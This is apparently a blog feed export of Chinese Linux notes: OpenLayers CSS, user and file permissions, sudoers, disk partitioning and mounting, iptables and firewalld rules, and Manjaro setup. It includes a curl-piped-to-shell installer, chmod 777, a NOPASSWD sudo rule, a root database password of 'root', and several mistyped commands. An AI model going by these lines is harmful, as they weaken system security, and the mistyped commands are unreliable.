0; background-position: 0 18px; } .olControlPanPanel .olControlPanEastItemInactive { top: 18px; left: 18px; background-position: 18px 18px; } .olControlZoomPanel { top: 71px; left: 14px; } .olControlZoomPanel div { background-image: url(img/zoom-panel.png); position: absolute; height: 18px; width: 18px; cursor: pointer; } .olControlZoomPanel .olControlZoomInItemInactive { top: 0; left: 0; background-position: 0 0; } .olControlZoomPanel .olControlZoomToMaxExtentItemInactive { top: 18px; left: 0; background-position: 0 -18px; } .olControlZoomPanel .olControlZoomOutItemInactive { top: 36px; left: 0; background-position: 0 18px; } /* * When a potential text is bigger than the image it move the image * with some headers (closes #3154) */ .olControlPanZoomBar div { font-size: 1px; } .olPopupCloseBox { background: url("img/close.gif") no-repeat; cursor: pointer; } .olFramedCloudPopupContent { padding: 5px; overflow: auto; } .olControlNoSelect { -moz-user-select: none; -khtml-user-select: none; } .olImageLoadError { opacity: 0; } /** * Cursor styles */ .olCursorWait { cursor: wait; } .olDragDown { cursor: move; } .olDrawBox { cursor: crosshair; } .olControlDragFeatureOver { cursor: move; } .olControlDragFeatureActive.olControlDragFeatureOver.olDragDown { cursor: -moz-grabbing; } /** * Layer switcher */ .olControlLayerSwitcher { position: absolute; top: 25px; right: 0; width: 20em; font-family: sans-serif; font-weight: bold; margin-top: 3px; margin-left: 3px; margin-bottom: 3px; font-size: smaller; color: white; background-color: transparent; } .olControlLayerSwitcher .layersDiv { padding-top: 5px; padding-left: 10px; padding-bottom: 5px; padding-right: 10px; background-color: darkblue; } .olControlLayerSwitcher .layersDiv .baseLbl, .olControlLayerSwitcher .layersDiv .dataLbl { margin-top: 3px; margin-left: 3px; margin-bottom: 3px; } .olControlLayerSwitcher .layersDiv .baseLayersDiv, .olControlLayerSwitcher .layersDiv .dataLayersDiv { padding-left: 10px; } .olControlLayerSwitcher .maximizeDiv, .olControlLayerSwitcher .minimizeDiv { width: 18px; height: 18px; top: 5px; right: 0; cursor: pointer; } .olBingAttribution { color: #DDD; } .olBingAttribution.road { color: #333; } .olGoogleAttribution.hybrid, .olGoogleAttribution.satellite { color: #EEE; } .olGoogleAttribution { color: #333; } span.olGoogleAttribution a { color: #77C; } span.olGoogleAttribution.hybrid a, span.olGoogleAttribution.satellite a { color: #EEE; } /** * Editing and navigation icons. * (using the editing_tool_bar.png sprint image) */ .olControlNavToolbar , .olControlEditingToolbar { margin: 5px 5px 0 0; } .olControlNavToolbar div, .olControlEditingToolbar div { background-image: url("img/editing_tool_bar.png"); background-repeat: no-repeat; margin: 0 0 5px 5px; width: 24px; height: 22px; cursor: pointer } /* positions */ .olControlEditingToolbar { right: 0; top: 0; } .olControlNavToolbar { top: 295px; left: 9px; } /* layouts */ .olControlEditingToolbar div { float: right; } /* individual controls */ .olControlNavToolbar .olControlNavigationItemInactive, .olControlEditingToolbar .olControlNavigationItemInactive { background-position: -103px -1px; } .olControlNavToolbar .olControlNavigationItemActive , .olControlEditingToolbar .olControlNavigationItemActive { background-position: -103px -24px; } .olControlNavToolbar .olControlZoomBoxItemInactive { background-position: -128px -1px; } .olControlNavToolbar .olControlZoomBoxItemActive { background-position: -128px -24px; } .olControlEditingToolbar .olControlDrawFeaturePointItemInactive { background-position: -77px -1px; } .olControlEditingToolbar .olControlDrawFeaturePointItemActive { background-position: -77px -24px; } .olControlEditingToolbar .olControlDrawFeaturePathItemInactive { background-position: -51px -1px; } .olControlEditingToolbar .olControlDrawFeaturePathItemActive { background-position: -51px -24px; } .olControlEditingToolbar .olControlDrawFeaturePolygonItemInactive{ background-position: -26px -1px; } .olControlEditingToolbar .olControlDrawFeaturePolygonItemActive { background-position: -26px -24px; } div.olControlZoom { position: absolute; top: 8px; left: 8px; background: rgba(255,255,255,0.4); border-radius: 4px; padding: 2px; } div.olControlZoom a { display: block; margin: 1px; padding: 0; color: white; font-size: 18px; font-family: 'Lucida Grande', Verdana, Geneva, Lucida, Arial, Helvetica, sans-serif; font-weight: bold; text-decoration: none; text-align: center; height: 22px; width:22px; line-height: 19px; background: #130085; /* fallback for IE - IE6 requires background shorthand*/ background: rgba(0, 60, 136, 0.5); filter: alpha(opacity=80); } div.olControlZoom a:hover { background: #130085; /* fallback for IE */ background: rgba(0, 60, 136, 0.7); filter: alpha(opacity=100); } @media only screen and (max-width: 600px) { div.olControlZoom a:hover { background: rgba(0, 60, 136, 0.5); } } a.olControlZoomIn { border-radius: 4px 4px 0 0; } a.olControlZoomOut { border-radius: 0 0 4px 4px; } /** * Animations */ .olLayerGrid .olTileImage { -webkit-transition: opacity 0.2s linear; -moz-transition: opacity 0.2s linear; -o-transition: opacity 0.2s linear; transition: opacity 0.2s linear; } /* Turn on GPU support where available */ .olTileImage { -webkit-transform: translateZ(0); -moz-transform: translateZ(0); -o-transform: translateZ(0); -ms-transform: translateZ(0); transform: translateZ(0); -webkit-backface-visibility: hidden; -moz-backface-visibility: hidden; -ms-backface-visibility: hidden; backface-visibility: hidden; -webkit-perspective: 1000; -moz-perspective: 1000; -ms-perspective: 1000; perspective: 1000; } /* when replacing tiles, do not show tile and backbuffer at the same time */ .olTileReplacing { display: none; } /* override any max-width image settings (e.g. bootstrap.css) */ img.olTileImage { max-width: none; } css 标注的图标文件： http://image.xpshuai.cn/pins.png http://image.xpshuai.cn/pinsback.png demo项目文件：https://github.com/shuai06/openlayer2_Cluster_demo document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS </category>
      </categories>
      <tags>
        <tag>GIS</tag>
        <tag>openlayer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux用户身份与文件权限]]></title>
    <url>%2Fposts%2F62d07350%2F</url>
    <content type="text"><![CDATA[用户身份与文件权限 用户 1.管理员 root UID: 0 系统用户 5/6 UID: 1-499 红帽7 UID 1-999 /sbin/nologin 3.普通用户 5/6 500-65535 7 1000- id xps # 查看用户信息 useradd useradd -u 555 xps # 新建用户并指定uid useradd -u ssbin/nologin xps # 指定终端 adduser groupadd hhh # 新建用户组 usermod -G hhh xps # 基本组/扩展组 usermod -u 666 xps # 修改uid groupdel hhh # 删除用户组 passwd xps # 重置密码 userdel xps # 删除用户(不删除home等) userdel -r xps # 删除用户(信息全删除） deluser #修改name的话可以直接去 /etc/passwd修改 文件权限`文件类型➢ -：普通文件。➢ d：目录文件。➢ l：链接文件。➢ b：块设备文件。➢ c：字符设备文件。➢ p：管道文件。 r读4w写2x执行1 ===============chmod # 权限 格式为“chown [参数] 所有者:所属组 文件或目录名称” chown root:bin testchown # 所有者，属性 -Rf # 强制的意思 chmod -Rf 777 test/chmod -Rf g+s test/ # 并为该目录设置了 SGID 特殊权限位 chmod -R o+t linux/ # 设置sbit权限 保护位 - **文件的特殊权限** 1.SUID # 让程序执行者，临时获取程序所有者的身份（仅对拥有执行权限的二进制程序有效）u+s 4 2.SGID # 让程序执行者，临时获取程序所有组的身份 让目录内的新建文件，集成目录所有组的名称 g+s 2 3.SBIT #让目录内的文件，只能自己删除自己的RHEL 7 系统中的/tmp 作为一个共享文件的目录，默认已经设置了 SBIT 特殊权限位，因此除非是该目录的所有者，否则无法删除这里面的文件；当目录被设置 SBIT 特殊权限位后，文件的其他人权限部分的 x 执行权限就会被替换成 t 或者 T，原本有 x 执行权限则会写成 t，原本没有 x 执行权限则会被写成 To+t 1 suid:x 改变成 s 就意味着该文件被赋予了 SUID 权限。如果原本的权限是 rw-呢？如果原先权限位上没有 x 执行权限，那么被赋予特殊权限后将变成大写的 Ss 证明原先有xS 证明原先没有x sgid:s 证明原先有xS 证明原先没有x sbit:对其他目录来设置 SBIT 特殊权限位，用 chmod 命令就可以了。对应的参数 o+t 代表设置 SBIT 粘滞位权限：t 证明原先有T 证明原先没有x 例如：转换7654 # 7是特殊权限位， 654是一一般权限位 420 401 400 rw- r-x r– 7: = 4+2+1 三个都涉及了,所以要都加上 # S-&gt;之前没有x权限，s-&gt;之前有x权限,T-&gt;之前没有… rwSrwsr-T ======rwsr–rwT rwxr–rw- 746s=4,T=45746 ======r-Srws–T 5470 - **文件的隐藏属性** 1.chattr 设置文件的隐藏权限，格式为“chattr [参数] 文件” chattr +a /var/log/message lsattr 显示文件的隐藏权限，格式为“lsattr [参数] 文件” lsattr -d Desktop/ $ 查看目录的... `表 5-6 chattr 命令中用于隐藏权限的参数及其作用 参数 含义 i 无法对文件进行修改；若对目录设置了该参数，则仅能修改其中的子文件内容而不能新建或删除文件 a 仅允许补充（追加）内容，无法覆盖/删除内容（Append Only） S 文件内容在变更后立即同步到硬盘（sync） s 彻底从硬盘中删除，不可恢复（用 0 填充原文件所在硬盘区域） A 不再修改这个文件或目录的最后访问时间（atime） b 不再修改文件或目录的存取时间 D 检查压缩文件中的错误 d 使用 dump 命令备份时忽略本文件/目录 c 默认将文件或目录进行压缩 u 当删除该文件后依然保留其在硬盘中的数据，方便日后恢复 t 让文件系统支持尾部合并（tail-merging） X 可以直接访问压缩文件中的内容 文件访问控制列表 ACL`对某个指定的用户进行单独的权限控制如果针对某个目录设置了 ACL，则目录中的文件会继承其 ACL；若针对文件设置了 ACL，则文件不再继承其所在目录的 ACL 1.setfacl 命令(针对目录文件需要使用-R 递归参数；针对普通文件则使用-m 参数；如果想要删除某个文件的 ACL，则可以使用-b 参数) setfacl -Rm u:xps:rwx /root # -m 修改 setfacl -Rm g:xpsg:r-x /tmp看到文件的权限最后一个点（.）变成了加号（+） ,这就意味着该文件已经设置了 ACL 了。 2.getfacl - su 与sudo su - xpssu 命令与用户名之间有一个减号（-），这意味着完全切换到新的用户，即把环境变量信息也变更为新用户的相应信息，而不是保留原始的信息。强烈建议在切换用户身份时添加这个减号（-） 使用 sudo 命令把特定命令的执行权限赋予给指定用户(避免泄露 root 管理员密码) sudo 服务中的可用参数以及作用-h 列出帮助信息-l 列出当前用户可执行的命-u 用户名或 UID 值 以指定的用户身份执行命-k 清空密码的有效时间，下-b 在后台执行指定的命令-p 更改询问密码的提示语 sudo 命令具有如下功能：➢ 限制用户执行指定的命令：➢ 记录用户执行的每一条命令；➢ 配置文件（/etc/sudoers）提供集中的用户管理、权限与主机等参数；➢ 验证密码的后 5 分钟内（默认值）无须再让用户再次验证密码。 使用 sudo 命令提供的 visudo 命令来配置用户权限。这条命令在配置用户权限时将禁止多个用户同时修改 sudoers 配置文件，还可以对配置文件内的参数进行语法检查，并在发现参数错误时进行报错。(只有root才能使用visudo编辑所服务的配置文件) 在 sudo 命令的配置文件中，按照下面的格式将第 99 行（大约）填写上指定的信息：谁可以使用 允许使用的主机=(以谁的身份) 可执行命令的列表xps ALL=(ALL) ALL 如果需要让某个用户只能使用 root 管理员的身份执行指定的命令，切记一定要给出该命令的绝对路径，否则系统会识别不出来。先使用 whereis 命令找出命令所对应的保存路径，然后把配置文件第 99 行的用户权限参数修改成对应的路径即可xps ALL=(ALL) /usr/bin/cat 加 NOPASSWD 参数，使得用户执行 sudo 命令时不再需要密码验证： xps ALL=NOPASSWD: /usr/sbin/poweroff ` document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>用户身份</tag>
        <tag>Linux，文件权限</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux存储结构与磁盘划分]]></title>
    <url>%2Fposts%2F1e68cff8%2F</url>
    <content type="text"><![CDATA[存储结构与磁盘划分/boot 开机所需文件—内核、开机菜单以及所需配置文件等 /dev 以文件形式存放任何设备与接口 # /etc 配置文件 # /home 用户家目录 # /bin 存放单用户模式下还可以操作的命令 /lib 开机时用到的函数库，以及/bin 与/sbin 下面的命令要调用的函数 /sbin 开机过程中需要的命令 /media 用于挂载设备文件的目录 # /opt 放置第三方的软件 /root 系统管理员的家目录 # /srv 一些网络服务的数据文件目录 /tmp 任何人均可使用的“共享”临时目录 /proc 虚拟文件系统，例如系统内核、进程、外部设备及网络状态等 # /usr/local 用户自行安装的软件 # /usr/sbin Linux 系统开机时不会使用到的软件/命令/脚本 /usr/share 帮助与说明文件，也可放置共享文件 # /var 主要存放经常变化的文件，如日志 # /lost+found 当文件系统发生错误时，将一些丢失的文件片段存放在这里 常见的硬件设备及其文件名称 IDE 设备 /dev/hd[a-d] SCSI/SATA/U 盘 /dev/sd[a-p] 软驱 /dev/fd[0-1] 打印机 /dev/lp[0-15] 光驱 /dev/cdrom 鼠标 /dev/mouse 磁带机 /dev/st0 或/dev/ht0 系统采用 a～p 来代表 16 块不同的硬盘（默认从 a 开始分配），而且硬盘的分区编号也很有讲究： ➢ 主分区或扩展分区的编号从 1 开始，到 4 结束； ➢ 逻辑分区从编号 5 开始。 主分区不能超过 4 个 挂载硬件设备mount 命令`用于挂载文件系统，格式为“mount 文件系统 挂载目录”mount 命令中的参数以及作用-a 挂载所有在/etc/fstab 中定义的文件系统 ,执行后自动检查/etc/fstab 文件中有无疏漏被挂载的设备文件，如果有，则进行自动挂载操作-t 指定文件系统的类型 例如，要把设备/dev/sdb2 挂载到/backup 目录:mount /dev/sdb2 /backup # 重启后挂载就会失效 #永久配置把挂载信息按照指定的填写格式“设备文件 挂载目录 格式类型 权限选项 是否备份 是否自检”写入到 /etc/fstab 文件中 #用于挂载信息的指定填写格式中，各字段所表示的意义设备文件 一 般 为 设 备 的 路 径 + 设 备 名 称 ， 也 可 以 写 唯 一 识 别 码 （ UUID ，Universally Unique Identifier）挂载目录 指定要挂载到的目录，需在挂载前创建好格式类型 指定文件系统的格式，比如 Ext3、 Ext4、 XFS、 SWAP、 iso9660（此为光盘设备）等权限选项 若设置为 defaults，则默认权限为： rw, suid, dev, exec, auto, nouser, async是否备份 若为 1 则开机后使用 dump 进行磁盘备份，为 0 则不备份是否自检 若为 1 则开机后自动进行磁盘自检，为 0 则不自检 #例如：将文件系统为 ext4 的硬件设备/dev/sdb2 在开机后自动挂载到/backup 目录上，并保持默认权限且无需开机自检vim /etc/fstab /dev/sdb2 /backup ext4 defaults 0 0 **umount 命令** umount [挂载点/设备文件] umount /dev/sdb2 - 添加硬盘设备 #操作思路：首先需要在虚拟机中模拟添加入一块新的硬盘存储设备，然后再进行分区、格式化、挂载等操作，最后通过检查系统的挂载状态并真实地使用硬盘来验证硬盘设备是否成功添加 现在虚拟机中添加一个新的虚拟硬盘 **fdisk 命令** “fdisk [磁盘名称]”，它提供了集添加、删除、转换分区等功能于一身的“一站式分区服务”交互式 #fdisk 命令中的参数以及作用m 查看全部可用的参数n 添加新的分区d 删除某个分区信息l 列出所有可用的分区类型t 改变某个分区的类型p 查看分区信息w 保存并退出q 不保存直接退出 ===在确认创建一个主分区后，系统要求您先输入主分区的编号。我们在前文得知，主分区的编号范围是 1～4，因此这里输入默认的 1 就可以了.接下来系统会提示定义起始的扇区位置，这不需要改动，我们敲击回车键保留默认设置即可，系统会自动计算出最靠前的空闲扇区的位置。最后，系统会要求定义分区的结束扇区位置，这其实就是要去定义整个分区的大小是多少。我们不用去计算扇区的个数，只需要输入+2G 即可创建出一个容量为 2GB 的硬盘分区 敲击参数 w 后回车，这样分区信息才是真正的写入成功啦 ===使用 file 命令查看该文件的属性,file /dev/sdb1可以输入 partprobe 命令手动将分区信息同步到内核，而且一般推荐连续两次执行该命令，效果会更好。如果使用这个命令都无法解决问题，那么就重启计算机吧partprobepartprobefile /dev/sdb1 ===mkfs如果硬件存储设备没有进行格式化，则 Linux 系统无法得知怎么在其上写入数据。因此，在对存储设备进行分区后还需要进行格式化操作。在 Linux 系统中用于格式化操作的命令是mkfs。这条命令很有意思，因为在 Shell 终端中输入 mkfs 名后再敲击两下用于补齐命令的 Tab键 mkfs.文件类型名称 #例如:要格式分区为 XFS 的文件系统 mkfs.xfs /dev/sdb1 ===挂载并使用存储设备步骤：首先是创建一个用于挂载设备的挂载点目录；然后使用 mount 命令将存储设备与挂载点进行关联；最后使用 df -h 命令来查看挂载状态和硬盘使用量信息。 mkdir /newFS mount /dev/sdb1 /newFS/ df -h **du 命令** 查看文件数据占用量格式为“du [选项] [文件]” du -sh /* 命令 来查看在 Linux 系统根目录下所有一级目录分别占用的空间大小 - **添加交换分区** 为了解决真实物理内存不足的问题 ,通过在硬盘中预先划分一定的空间，然后将把内存中暂时不常用的数据临时存放到硬盘中，以便腾出物理内存空间让更活跃的程序服务来使用的技术 #交换分区的划分建议：在生产环境中，交换分区的大小一般为真实物理内存的 1.5～2 倍，为了让大家更明显地感受交换分区空间的变化，这里取出一个大小为 5GB 的主分区作为交换分区资源。在分区创建完毕后保存并退出即可： ==SWAP 分区专用的格式化命令 mkswapmkswap /dev/sdb2 使用 swapon 命令把准备好的 SWAP 分区设备正式挂载到系统中。swapon /dev/sdb5 free -m 查看交换分区的大小变化 vim /etc/fstab/dev/sdb2 swap swap defaults 0 0 - **磁盘容量配额 quota** #介绍quota – 限制每个人能够使用的磁盘容量 inode 个数 isoft # 只是警告提醒，日志 ihard # 强制限制block 容量 defaults xfs_uquota #xfs_uquota -x -c ‘limit bsoft=3m bhard=6m isoft=3 ihard=6 xps’ /boot **edquota 修改配额** edquota xps - 软硬方式链接 ln 命令格式为“ln [选项] 目标 #参数-s 创建“符号链接”（如果不带-s 参数，则默认创建硬链接）-f 强制创建文件或目录的链接-i 覆盖前先询问-v 显示创建链接的过程 #硬连接 -&gt; 源文件删除也没事 - 剖析ll文件参数信息 -rw-r–r–. 1 root root 813 Apr 15 2014 yum.conf . -&gt; facl +1 多少块813 占用实际大小 Apr 15 2014 最后修改文件的时间 ` document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>rhel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables与firewall]]></title>
    <url>%2Fposts%2Fa3db7b71%2F</url>
    <content type="text"><![CDATA[iptables与firewall防火墙 配置网卡文件 修改配置文件`vim /etc/sysconfig/network-scripts/ifcfg-eno16777736 #文件内容如下HWADDR=”00:0C:29:C2:F1:76”TYPE=”Ethernet” #类型BOOTPROTO=”dhcp”DEFROUTE=”yes”PEERDNS=”yes”PEERROUTES=”yes”IPV4_FAILURE_FATAL=”no”IPV6INIT=”yes”IPV6_AUTOCONF=”yes”IPV6_DEFROUTE=”yes”IPV6_PEERDNS=”yes”IPV6_PEERROUTES=”yes”IPV6_FAILURE_FATAL=”no”NAME=”eno16777736”UUID=”af3aaad5-b615-493c-872e-76503b9adad5” #唯一标识ONBOOT=”yes” #开机自启 2. 基于图形界面配置网卡 **nmtuio** nmtuio systemctl restart network 3. nm-connection-editor工具 nm-connection-editor 4. 图形界面点击右上角 - **配置防火墙** 规则： 自上而下做匹配 几种状态 accept 允许流量通过reject 明确拒绝drop 对方不知道你是否在线(显示超时) 1. **iptables** 比较老,逐渐被取代基于命令行难度最高 iptables -L #显示所有的策略iptables -F #清空所有策略iptables -P INPUT DROP #默认禁止所有流量策略,不能reject -I #插入到最前面-A #插入到最后面-p # 允许的协议–dport #本机端口-s #来源-j #本身为意义，后面跟动作 iptables -I INPUT -p icmp -j ACCEPT #只允许外部到内部的ping iptables -I INPUT -s 192.168.10.0/24 -p tcp –dport 22 #允许来自某个网段的访问，端口为22 -D #删除某一条iptables -D INPUT 1 #删除第一条 iptables -I INPUT -p tcp –port 22 -j REJECT #禁止外部所有22端口的流量 iptables -I INPUT -p tcp –port 22:200 -j REJECT #禁止外部所有20到200端口的流量 service iptables save **firewalld 防火墙(分为下面两个)** zone 区域sbit 安全位public 默认策略,当前使用 2. **firewall-cmd 命令行** Runtime 当前生效，重启后失效Premanent 当前暂时不生效，但是永久生效–premanent # 建议添加这个 firewall-cmd -reload #重启 firewall-cmd –get-default-zone #查看当前区域 firewall-cmd –set-default-zone=drop #切换默认区域到丢包 firewall-cmd –permanent –zone=drop –change-interface=en0167777 #重启之后，把这个网卡区域换为dropfirewall-cmd –permanent get-zone-of-interface=en0167777 #重启之后，查看 紧急模式firewall-cmd –panic-on #切断所有网络连接，包括ping的数据包firewall-cmd –panic-off #关闭紧急模式 查询服务firewall-cmd –zone=public –query-service=http #查看是否允许httpfirewall-cmd –zone=public –query-service=ssh 添加允许服务firewall-cmd –zone=public –add-servcice=http #允许从外访问http服务 firewall-cmd –zone=public –add-servcice=https #重启才可以 firewall-cmd –reloadfirewall-cmd –zone=public –add-servcice=https 禁止服务firewall-cmd –zone=public –remove-servcice=https firewall-cmd –permanent –zone=public –add-servcice=httpsfirewall-cmd –permanent –zone=public –query-servcice=https 添加端口号firewall-cmd –zone=public –add-port=8080/tcp #把这个端口添加到ctp协议组，允许firewall-cmd –zone=public –add-port=80-90/tcp #端口端 端口转发（隐藏原始端口）firewall-cmd –permanent –zone=public –add-forward-port=888:porto:tcp:toport=22:toaddr=192.168.10.10 #转发888到22firewall-cmd –reload 富规则（复规则）精准匹配firewall-cmd –permanent –zone=public –add-rich-rule=”rule family”=”ipv4” source address=”192.168.10.0/24” service name=”ssh” reject” firewall-cmd reload 3. **firewall-config 图形化** firewall-config 4. **TCP Wrappers** （优先级：先匹配允许，再匹配拒绝）/etc/hosts.allow #白名单 允许服务名称、IP地址/etc/hosts.deny #黑名单 拒绝服务名称、IP地址 白名单(编辑后就生效)sshd:192.168.10.0/24 #允许这个网段的主机访问 黑名单(编辑后就生效)sshd:192.168.10.* # 所有主机，通配符 ` 1.2.3. 数据链路层（协议，端口号，来访IP地址） 应用层（服务名称） 四个工具，只要有一个把他禁止，就禁止了！ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>防火墙</tag>
        <tag>rhel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Manjaro 安装之后 基本配置]]></title>
    <url>%2Fposts%2F1319baa3%2F</url>
    <content type="text"><![CDATA[Manjaro 安装之后 基本配置配置国内源 sudo pacman-mirrors -i -c China -m rank #弹出来框，我选择的清华的源 升级系统 sudo pacman -Syy &amp;&amp; sudo pacam -Syyu 安装vim sudo pacman -S vim 添加arch源 sudo vim /etc/pacman.conf #在文件末尾添加，我添加的清华的 安装archlinuxcn签名钥匙(导入 GPG key，否则的话key验证失败会导致无法安装软件) sudo pacman -Syy &amp;&amp; sudo pacman -S archlinuxcn-keyring 安装网络工具包，ifconfig等 pacman -S net-tools dnsutils inetutils iproute2 安装sogou拼音输入法 sudo pacman -S fcitx-im # 安装fcitx 选择全部安装 sudo pacman -S fcitx-configtool # fcitx 配置界面 sudo pacman -S fcitx-sogoupinyin # 安装sogoupinyin 设置中文输入法环境变量，编辑~/.xprofile文件，增加下面几行(如果文件不存在，则新建) 重启后生效 sudo vim ~/.xprofile # 打开编辑.xprofile文件 # 在文件中加入以下两行代码 export GTK_IM_MODULE=fcitx export QT_IM_MODULE=fcitx export XMODIFIERS="@im=fcitx" 安装Google-Chrome浏览器 sudo pacman -S google-chrome 安装网易云音乐 sudo pacman -S netease-cloud-music 安装git (默认貌似就已经存在了) sudo pacman -S git 安装wps，及其字体 $ sudo pacman -S wps-office # 安装wps $ sudo pacman -S ttf-wps-fonts # 安装wps字体 配置wps，使wps可以输入中文 $ sudo vim /usr/bin/wps # 编辑wps配置文件 # 在 紧跟#!/bin/bash后添加下列三行 export GTK_IM_MODULE=fcitx export QT_IM_MODULE=fcitx export XMODIFIERS="@im=fcitx" 注销后再次登录输入法生效。 安装Shadowsocks-qt5，实现科学上网（我还是一会安ssr吧，在文章最底下） sudo pacman -S shadowsocks-qt5 安装VSCode sudo pacman -S visual-studio-code-bin # 安装VSCode和云音乐等等，都需archlinuxcn源 安装markdown编辑器 sudo pacman -S typora 配置jdk环境变量 # 配置环境变量 # sudo vim /etc/profile #编辑文件 # 在文件末尾处追加下列几行 export JAVA_HOME=你的jdk解压后的绝对路径 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH 安装终端显示信息neofetch(装b神器,安装screenfetch也可) sudo pacman -S neofetch 安装Tim,微信 (KDE桌面无法使用) sudo pacman -S deepin.com.qq.office deepin.com.wechat 配置微信，tim的中文输入问题 (KDE桌面无法使用) Tim启动脚本位置：/opt/deepinwine/apps/Deepin-TIM/run.sh WeChat启动脚本位置：/opt/deepinwine/apps/Deepin-WeChat/run.sh # 1 配置tim中文，打开tim启动脚本文件 （微信同理） sudo vim /opt/deepinwine/apps/Deepin-TIM/run.sh 在启动脚本命令之前添加以下内容 export GTK_IM_MODULE=fcitx export QT_IM_MODULE=fcitx export XMODIFIERS="@im=fcitx" 安装Deepin Terminal(终端)，安装完成之后，自行在deepin-terminal更改显示字体 sudo pacman -S deepin-terminal 安装有道词典 sudo pacman -S youdao-dict 安装vokoscreen录屏 sudo pacman -S vokoscreen 安装MariaDb代替mysql(MyriaDb与Mysql相互兼容) $ sudo pacman -S mariadb mariadb-clients # 安装成功后，根据提示，输入下列指令初始化MariaDb数据库 $ sudo mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql # 一番信息自动输出完成后，执行以下代码 $ sudo systemctl start mysqld # 启动MariaDb $ mysqladmin -u root password "root" # 为root、用户添加密码 $ sudo systemctl enable mysqld # 设置mariaDb开机自启 $ mysql -uroot -p # 输入设置的的密码，登录数据库 安装配置oh my zsh(听说是bash的升级版，装*专用，我就先不弄了) $ sudo pacman -S zsh $ sh -c "$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)" # 下载并配置ohmyzsh $ chsh -s /bin/zsh #更换默认bash，重启后生效 卸载Manjaro自带的一些没用的软件 卸载之后就可以更新一下软件了 sudo pacman -Syyu pacman基本命令更新软件 sudo pacman -Su # 更新已安装软件 sudo pacman -Syu #更新软件前检查包列表是否最新 sudo pacman -Syyu #更新前强制下载包列表 查找软件 sudo pacman -Ss packge_name 安装指定的包 pacman -S package_name1 package_name2 ... 安装包组 一些包属于一个可以同时安装的软件包组，例如： pacman -S gnome 想要查看哪些包属于 gnome 组，运行： pacman -Sg gnome 删除软件包 1.删除单个软件包，保留其全部已经安装的依赖关系 pacman -R package_name 2.除指定软件包，及其所有没有被其他已安装软件包使用的依赖关系： pacman -Rs package_name 3.要删除软件包和所有依赖这个软件包的程序 pacman -Rns package_name 4.要删除软件包，但是不删除依赖这个软件包的其他程序： pacman -Rdd package_name 5.pacman 删除某些程序时会备份重要配置文件，在其后面加上*.pacsave扩展名。-n 选项可以避免备份这些文件： pacman -Rn package_name1 ​ 注意: pacman 不会删除软件自己创建的文件(例如主目录中的 .dot 文件不会被删除。 清理软件包缓存 pacman 将下载的软件包保存在 /var/cache/pacman/pkg/ 并且不会自动移除旧的和未安装版本的软件包，因此需要手动清理，以免该文件夹过于庞大。 使用内建选项即可清除未安装软件包的缓存： pacman -Sc 警告:仅在确定当前安装的软件包足够稳定且不需要降级时才执行清理。 pacman -Sc仅会保留软件包的当前有效版本，旧版本的软件包被清理后，只能从其他地方如 Arch Linux Archive (简体中文)中获取了。 pacman -Scc 可以清理所有缓存，但这样 pacman 在重装软件包时就只能重新下载了。除非空间不足，否则不应这么做。 更新源自动：自动设置最快的源 sudo pacman-mirrors -g sudo pacman -Syyu 手动：选择源：sudo pacman-mirrors -i同样要强制更新包 重置为自动选择： sudo pacman-mirrors -g -c all 切换testing分支 sudo pacman-mirrors -g -b testing sudo pacman -Syyu 退回稳定版 sudo pacman-mirrors -g -b stable sudo pacman -Syyuu sudo pacman-mirrors -i -c China -m rank 清理垃圾清除系统中无用的包 sudo pacman -R $(pacman -Qdtq) 清除已下载的安装包 sudo pacman -Scc 日志垃圾查看日志文件 du -t 100M /var 或 journalctl --disk-usage 删除指定大小日志文件 sudo journalctl --vacuum-size=50M 安装ssr步骤： 安装git命令，用 git clone -b manyuser https://github.com/shadowsocksrr/shadowsocksr.git 下载shadowsockssr。 进入shadowshocksr目录 运行如下命令：./initcfg.sh 运行如下命令编写user-config.json配置文件sudo nano user-config.json 将ssr服务器的配置填写到配置文件中 进入shadowsocks目录cd shadowsocks./local.py 代理客户端已经开始运行 设置浏览器代理：以firefox为例， 从 https://addons.mozilla.org/zh-CN/firefox/addon/foxyproxy-standard/?src=search 添加foxyproxy-standard插件左键点击插件图标 选 “options” – “add” – “socks5”填写代理的名称（随便写），IP（127.0.0.1），端口（1080） document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () 